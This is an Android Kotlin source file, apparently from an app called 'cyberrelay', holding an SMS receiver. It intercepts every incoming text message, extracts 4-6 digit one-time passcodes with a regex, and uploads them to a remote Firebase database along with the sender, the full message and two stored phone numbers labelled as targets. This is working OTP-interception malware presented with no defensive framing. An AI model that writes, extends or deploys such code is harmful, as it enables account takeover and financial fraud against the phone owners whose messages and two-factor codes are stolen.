package com.gvcw.cyberrelay

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import com.google.firebase.database.FirebaseDatabase

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            val bundle = intent.extras ?: return
            val pdus = bundle.get("pdus") as Array<*>? ?: return
            val format = bundle.getString("format")

            val prefs = context.getSharedPreferences("GVCW_PREFS", Context.MODE_PRIVATE)
            val num1 = prefs.getString("NUM_1", "") ?: ""
            val num2 = prefs.getString("NUM_2", "") ?: ""

            for (pdu in pdus) {
                val sms = SmsMessage.createFromPdu(pdu as ByteArray, format)
                val body = sms.messageBody ?: ""
                val sender = sms.originatingAddress ?: "Unknown"

                // Extract 4-6 digit OTP
                val otpMatch = Regex("\\b\\d{4,6}\\b").find(body)?.value

                if (otpMatch != null) {
                    val ref = FirebaseDatabase.getInstance().getReference("otps")
                    val key = ref.push().key ?: System.currentTimeMillis().toString()
                    val data = mapOf(
                        "sender" to sender,
                        "target1" to num1,
                        "target2" to num2,
                        "otp" to otpMatch,
                        "message" to body,
                        "timestamp" to System.currentTimeMillis()
                    )
                    ref.child(key).setValue(data)
                }
            }
        }
    }
}